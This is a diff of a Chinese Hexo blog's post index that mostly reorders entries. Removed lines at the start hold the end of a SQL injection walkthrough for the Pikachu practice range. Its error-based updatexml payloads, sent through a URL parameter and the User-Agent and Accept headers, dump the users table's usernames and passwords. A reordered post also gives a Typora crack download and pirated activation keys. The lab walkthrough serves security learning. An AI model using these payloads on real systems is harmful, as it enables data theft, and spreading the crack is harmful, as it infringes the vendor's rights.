-<p>查询指定数据库表名</p>
-<pre class="language-none"><code class="language-none">56+and+updatexml(1,concat(0x7e,(select+group_concat(schema_name)+from+information_schema.schemata),0x7e),2)</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144447.png" alt="56" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">56+and+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema&#x3D;database()+and+table_name&#x3D;&#39;users&#39;),0x7e),2)</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144449.png" alt="57" loading="lazy"></p>
-<p>查询表下所有数据</p>
-<pre class="language-none"><code class="language-none">56+or+updatexml(1,concat(0x7e,(select+group_concat(id,username,password,level)+from+users),0x7e),2)
-或拖过limit读取
-56+or+updatexml(1,concat(0x7e,(select+password+from+users+limit+0,1)),1)</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144450.png" alt="58" loading="lazy"></p>
-<h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><p>输入admin&#x2F;123456，点击login登录</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144452.png" alt="59" loading="lazy"></p>
-<p> 打开burp的拦截，刷新该页面，将拦截到的报文发送至repeater。</p>
-<p>修改user agent或Accept参数注入</p>
-<h4 id="User-Agent-处注入"><a href="#User-Agent-处注入" class="headerlink" title="User-Agent:处注入"></a>User-Agent:处注入</h4><p>查询数据库名</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select database())),1)or&#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144457.png" alt="60" loading="lazy"></p>
-<p>查询所有数据库</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),2)or &#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144502.png" alt="61" loading="lazy"></p>
-<p>查询指定数据库表名</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),2)or &#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144505.png" alt="62" loading="lazy"></p>
-<p>查询指定表下的字段名</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),0x7e),2)or &#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144507.png" alt="63" loading="lazy"></p>
-<p>查询指定表下的所有数据</p>
-<pre class="language-none"><code class="language-none"> &#39; or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2)or &#39;
-或者
-&#39; or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or&#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144509.png" alt="64" loading="lazy"></p>
-<h4 id="Accept处注入"><a href="#Accept处注入" class="headerlink" title="Accept处注入"></a>Accept处注入</h4><p>查询数据库名</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select database())),1)or&#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144512.png" alt="65" loading="lazy"></p>
-<p>查询所有数据库</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),2)or &#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144515.png" alt="66" loading="lazy"></p>
-<p>查询指定数据库表名</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),2)or &#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144517.png" alt="67" loading="lazy"></p>
-<p>查询指定表下的字段名</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),0x7e),2)or &#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144519.png" alt="68" loading="lazy"></p>
-<p>查询指定表下的所有数据</p>
-<pre class="language-none"><code class="language-none"> &#39; or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2)or &#39;
-或者
-&#39; or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or&#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144521.png" alt="69" loading="lazy"></p>
-<hr>
-<p>参考链接： </p>
-<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
-<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -4703,21 +4703,6 @@ Ruijie#terminal monitor </code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Typora破解</title>
-    <url>/posts/97fee53e/</url>
-    <content><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1lBwPXa4DG_3EQbH_Jhd8cg?pwd=nl4a">https://pan.baidu.com/s/1lBwPXa4DG_3EQbH_Jhd8cg?pwd=nl4a</a><br>提取码：nl4a</p>
-<h3 id="安装后"><a href="#安装后" class="headerlink" title="安装后"></a>安装后</h3><p>1、覆盖文件<br>将 app.asar.txt 文件名中的“.txt”去掉，并覆盖至安装路径的“resources”文件夹内，参考路径：<br>C:\Program Files\Typora\resources<br>2、输入序列号<br>打开 typora ，点击“输入序列号”<br>邮箱一栏中任意填写（但须保证邮箱地址格式正确），输入序列号，点击“激活”。<br>邮箱地址例如：<a href="mailto:&#49;&#x40;&#49;&#46;&#x63;&#x6f;&#109;">&#49;&#x40;&#49;&#46;&#x63;&#x6f;&#109;</a><br>激活码：<br>● DZTX2H-6MCQZT-QL4GCT-5EBWFX<br>● G7LPKN-HP4NLD-FA3BGF-6JDQ5R<br>● 3MH4Y8-YJWT37-G5JL9Y-UHNQDJ<br>● 85ZPHY-ELQ9FQ-94J3VP-D92YLU<br>● VEZ7NV-USYN3G-8TL2N3-DADUG4</p>
-<p>填写完成后激活成功</p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>破解</category>
-      </categories>
-      <tags>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Typora基本用法</title>
     <url>/posts/1bd41834/</url>
     <content><![CDATA[<p>[toc]</p>
@@ -5028,6 +5013,21 @@ cond(no)-&gt;op</code></pre>
       </categories>
       <tags>
         <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Typora破解</title>
+    <url>/posts/97fee53e/</url>
+    <content><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1lBwPXa4DG_3EQbH_Jhd8cg?pwd=nl4a">https://pan.baidu.com/s/1lBwPXa4DG_3EQbH_Jhd8cg?pwd=nl4a</a><br>提取码：nl4a</p>
+<h3 id="安装后"><a href="#安装后" class="headerlink" title="安装后"></a>安装后</h3><p>1、覆盖文件<br>将 app.asar.txt 文件名中的“.txt”去掉，并覆盖至安装路径的“resources”文件夹内，参考路径：<br>C:\Program Files\Typora\resources<br>2、输入序列号<br>打开 typora ，点击“输入序列号”<br>邮箱一栏中任意填写（但须保证邮箱地址格式正确），输入序列号，点击“激活”。<br>邮箱地址例如：<a href="mailto:&#49;&#x40;&#49;&#46;&#x63;&#x6f;&#109;">&#49;&#x40;&#49;&#46;&#x63;&#x6f;&#109;</a><br>激活码：<br>● DZTX2H-6MCQZT-QL4GCT-5EBWFX<br>● G7LPKN-HP4NLD-FA3BGF-6JDQ5R<br>● 3MH4Y8-YJWT37-G5JL9Y-UHNQDJ<br>● 85ZPHY-ELQ9FQ-94J3VP-D92YLU<br>● VEZ7NV-USYN3G-8TL2N3-DADUG4</p>
+<p>填写完成后激活成功</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>破解</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -7107,8 +7107,8 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《云边有个小卖部》摘抄</title>
     <url>/posts/4b648fc6/</url>
     <content><![CDATA[
-    <div id="aplayer-cBhVOurt" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="1435991724" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
+    <div id="aplayer-hlIwpxFt" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="1298779845" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
 
@@ -7211,7 +7211,7 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《天堂旅行团》摘抄</title>
     <url>/posts/7d0fc3d8/</url>
     <content><![CDATA[
-    <div id="aplayer-mnedVkMZ" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-QwRxkKOJ" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
@@ -7729,6 +7729,43 @@ hexo generate
       </tags>
   </entry>
   <entry>
+    <title>卡里安装pycharm后创建快捷方式</title>
+    <url>/posts/1f1dc0da/</url>
+    <content><![CDATA[<ol>
+<li><p>kali的快捷方式都放在&#x2F;usr&#x2F;share&#x2F;applications里，首先在该目录下创建一个Pycharm.desktop</p>
+</li>
+<li><p>终端输输入：</p>
+<pre class="language-none"><code class="language-none">dusudo vim &#x2F;usr&#x2F;share&#x2F;applications&#x2F;Pycharm.desktop</code></pre>
+</li>
+<li><p>粘贴模板zhi：</p>
+</li>
+</ol>
+<pre class="language-none"><code class="language-none">[Desktop Entry]
+Type&#x3D;Application
+Name&#x3D;Pycharm
+GenericName&#x3D;Pycharm3
+Comment&#x3D;Pycharm3:The Python IDE
+Exec&#x3D;sh &#x2F;opt&#x2F;pycharm&#x2F;bin&#x2F;pycharm.sh
+Icon&#x3D;&#x2F;opt&#x2F;pycharm&#x2F;bin&#x2F;pycharm.png
+Terminal&#x3D;pycharm
+Categories&#x3D;Pycharm;</code></pre>
+
+<p>注：Exec 是执行文件位置；</p>
+<p>​		Icon是快捷图标位置</p>
+<p>附:</p>
+<pre class="language-none"><code class="language-none">sudo apt-get autoremove                            删除系统不再使用的孤立软件
+sudo apt-get autoclean                              清理旧版本的软件缓存
+dpkg -l |grep ^rc|awk &#39;&#123;print $2&#125;&#39; |sudo xargs dpkg -P       清除残余的配置文件</code></pre>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>图片设置防盗链后部分图片不能显示</title>
     <url>/posts/90cb059e/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天给我的储存桶添加了放到链后我博客的相册页图片就都不能正常显示了……</p>
@@ -7840,43 +7877,6 @@ hexo generate
       </categories>
       <tags>
         <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>卡里安装pycharm后创建快捷方式</title>
-    <url>/posts/1f1dc0da/</url>
-    <content><![CDATA[<ol>
-<li><p>kali的快捷方式都放在&#x2F;usr&#x2F;share&#x2F;applications里，首先在该目录下创建一个Pycharm.desktop</p>
-</li>
-<li><p>终端输输入：</p>
-<pre class="language-none"><code class="language-none">dusudo vim &#x2F;usr&#x2F;share&#x2F;applications&#x2F;Pycharm.desktop</code></pre>
-</li>
-<li><p>粘贴模板zhi：</p>
-</li>
-</ol>
-<pre class="language-none"><code class="language-none">[Desktop Entry]
-Type&#x3D;Application
-Name&#x3D;Pycharm
-GenericName&#x3D;Pycharm3
-Comment&#x3D;Pycharm3:The Python IDE
-Exec&#x3D;sh &#x2F;opt&#x2F;pycharm&#x2F;bin&#x2F;pycharm.sh
-Icon&#x3D;&#x2F;opt&#x2F;pycharm&#x2F;bin&#x2F;pycharm.png
-Terminal&#x3D;pycharm
-Categories&#x3D;Pycharm;</code></pre>
-
-<p>注：Exec 是执行文件位置；</p>
-<p>​		Icon是快捷图标位置</p>
-<p>附:</p>
-<pre class="language-none"><code class="language-none">sudo apt-get autoremove                            删除系统不再使用的孤立软件
-sudo apt-get autoclean                              清理旧版本的软件缓存
-dpkg -l |grep ^rc|awk &#39;&#123;print $2&#125;&#39; |sudo xargs dpkg -P       清除残余的配置文件</code></pre>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -8294,26 +8294,6 @@ graph TD;
       </tags>
   </entry>
   <entry>
-    <title>我的博客插件</title>
-    <url>/posts/62d66f1a/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="噢，这是一个无效的密码。请检查并再试一次。" data-whm="哦，这些解密的内容无法验证，但您仍然可以查看一下">
-  <script id="hbeData" type="hbeData" data-hmacdigest="b02044d288df99bb72804e4d7df91e40d9714433ee52bcacd97455b30de66f05">6d3d76a501cfea921ccc75e341572a63911b394e068dd3c52e59ee35dc83571add661649bd801caad2fa4cdf7b9d8864675187990ed125dfd059c8a0332c88f482555edb4dfe7c6eae46f3f0598c8585442b0eecb169b0b2bc67fc2e9b9ebf0451a8d6e79da34544831c1adf9188835afa81c9bf6bb9b26183d3a68a967f841f2cd3246a3dd771d886af5ad67c5bb2914a1521bf57fc952b0d6c068c7c48cd30a1fc8c3879f0c01fb1e1d4bac25343678f4e137eb4164790f3e8228e146ac13fff3d45aaa8fda6365eb98daf8ac969ed47a0f5e86b75e7132b1cbce0fd0643631c638c568a707ac5f4c124a81b5409c55ca59f316f44dde0c827996bd965f73f1db1a049e00854ff932682b6a92726646306e36a9b675568179e1d245196a033433014c6b8e5532890cc912f91326d9bf2eafef88105ca289059b0ae5da7f591132e11d55201c9af499a47dc1d9fc5166a84718ba0652437dd7cb090e352b0366beafac717602b306b13ef061bc1cbc175df08a953d5239b96dbfa484a262ce816c866c61df89049c3a9dc9b901b24f21e78b71dd4f7e78e07ceabcfff8649b685bbe3b720b3c76876447342b63e8f0c84fa2fb9034dff438a9306d5b838d956720d0770ba286e9808f4b2bd3c6138cf6638cc39317780e805c7022e42170bd2069708a6cbf7525bea9212072a13264d7200154aeda48fff12f94673dc8aae691076ea3a8b96e3f26cb9dbcbe2381cdbf84caa0da98088f1c50a480b008eeb8a0be15ab82c8c481c54b1c9929a6d8814a72b166436a844df492ef2de7b10afaf05f8c915013d35be9b3baeba8400d6eea4822a5e7a7e03aa5e142c7666586c6340bb05fc261175c6522c507bedcd2070c940e276f6b75f6a72dcec884b6386416c213b9881d1da0d7dbe851e335053d681d82ae0c8a10f3e2c228c16f518a863e812ed75aa8d731631178786d0145183fa61789b720c1759985d56149ecec4240141be37aa22f135c74b3993453ab28f44ecf71ad0f2e1e86fc49fef6069125da6b4c0411924955d727ce603966c907fff32bdbbd7de189fe7a23e8f0844490d6df01ef573d2ddf7475802f8135b856d8684c7eb2a017813b030daeec1a437dc868be3756f4bd53a4f8bea953bd679cf471d1dd0e6be68dcd6326f78f85f6090d5c232502206e8a2a3bb9fcda05410c1a7e6169288da34dd217f54d54f21de3cfc6cb02e2a29fe5edecacbd48c8f307ced7f217e58c75d469a5f4d578009dbb56cac01a6394a2c07497e8c6a20727866</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>专栏</category>
-        <category>配置习惯</category>
-      </categories>
-  </entry>
-  <entry>
     <title>微机原理基础二</title>
     <url>/posts/ac776871/</url>
     <content><![CDATA[<h2 id="计算机中的编码，数制及转换"><a href="#计算机中的编码，数制及转换" class="headerlink" title="计算机中的编码，数制及转换"></a>计算机中的编码，数制及转换</h2><h3 id="常用进制"><a href="#常用进制" class="headerlink" title="常用进制"></a>常用进制</h3><p>二进制、八进制、十进制、十六进制</p>
@@ -8352,6 +8332,26 @@ graph TD;
       <tags>
         <tag>微机原理</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>我的博客插件</title>
+    <url>/posts/62d66f1a/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="噢，这是一个无效的密码。请检查并再试一次。" data-whm="哦，这些解密的内容无法验证，但您仍然可以查看一下">
+  <script id="hbeData" type="hbeData" data-hmacdigest="b02044d288df99bb72804e4d7df91e40d9714433ee52bcacd97455b30de66f05">6d3d76a501cfea921ccc75e341572a63911b394e068dd3c52e59ee35dc83571add661649bd801caad2fa4cdf7b9d8864675187990ed125dfd059c8a0332c88f482555edb4dfe7c6eae46f3f0598c8585442b0eecb169b0b2bc67fc2e9b9ebf0451a8d6e79da34544831c1adf9188835afa81c9bf6bb9b26183d3a68a967f841f2cd3246a3dd771d886af5ad67c5bb2914a1521bf57fc952b0d6c068c7c48cd30a1fc8c3879f0c01fb1e1d4bac25343678f4e137eb4164790f3e8228e146ac13fff3d45aaa8fda6365eb98daf8ac969ed47a0f5e86b75e7132b1cbce0fd0643631c638c568a707ac5f4c124a81b5409c55ca59f316f44dde0c827996bd965f73f1db1a049e00854ff932682b6a92726646306e36a9b675568179e1d245196a033433014c6b8e5532890cc912f91326d9bf2eafef88105ca289059b0ae5da7f591132e11d55201c9af499a47dc1d9fc5166a84718ba0652437dd7cb090e352b0366beafac717602b306b13ef061bc1cbc175df08a953d5239b96dbfa484a262ce816c866c61df89049c3a9dc9b901b24f21e78b71dd4f7e78e07ceabcfff8649b685bbe3b720b3c76876447342b63e8f0c84fa2fb9034dff438a9306d5b838d956720d0770ba286e9808f4b2bd3c6138cf6638cc39317780e805c7022e42170bd2069708a6cbf7525bea9212072a13264d7200154aeda48fff12f94673dc8aae691076ea3a8b96e3f26cb9dbcbe2381cdbf84caa0da98088f1c50a480b008eeb8a0be15ab82c8c481c54b1c9929a6d8814a72b166436a844df492ef2de7b10afaf05f8c915013d35be9b3baeba8400d6eea4822a5e7a7e03aa5e142c7666586c6340bb05fc261175c6522c507bedcd2070c940e276f6b75f6a72dcec884b6386416c213b9881d1da0d7dbe851e335053d681d82ae0c8a10f3e2c228c16f518a863e812ed75aa8d731631178786d0145183fa61789b720c1759985d56149ecec4240141be37aa22f135c74b3993453ab28f44ecf71ad0f2e1e86fc49fef6069125da6b4c0411924955d727ce603966c907fff32bdbbd7de189fe7a23e8f0844490d6df01ef573d2ddf7475802f8135b856d8684c7eb2a017813b030daeec1a437dc868be3756f4bd53a4f8bea953bd679cf471d1dd0e6be68dcd6326f78f85f6090d5c232502206e8a2a3bb9fcda05410c1a7e6169288da34dd217f54d54f21de3cfc6cb02e2a29fe5edecacbd48c8f307ced7f217e58c75d469a5f4d578009dbb56cac01a6394a2c07497e8c6a20727866</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>专栏</category>
+        <category>配置习惯</category>
+      </categories>
   </entry>
   <entry>
     <title>整理几个实用电脑软件</title>
